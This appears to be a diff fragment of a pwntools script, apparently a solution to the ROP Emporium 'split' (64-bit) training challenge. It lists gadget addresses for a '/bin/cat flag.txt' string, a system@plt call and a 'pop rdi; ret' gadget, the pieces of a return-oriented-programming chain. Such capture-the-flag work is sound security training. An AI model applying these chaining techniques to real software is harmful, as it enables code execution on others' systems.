@@ -2,6 +2,10 @@
 from pwn import *
 
 """
+Solution for ROP Emporium level 2: split (64 bit)
+"""
+
+"""
 cat flag: 0x601060 '/bin/cat flag.txt'
 call system: 0x000000000040074b <+9>:     call   0x400560 <system@plt>
 pop rdi, ret: 0x00000000004007c3: pop rdi; ret;
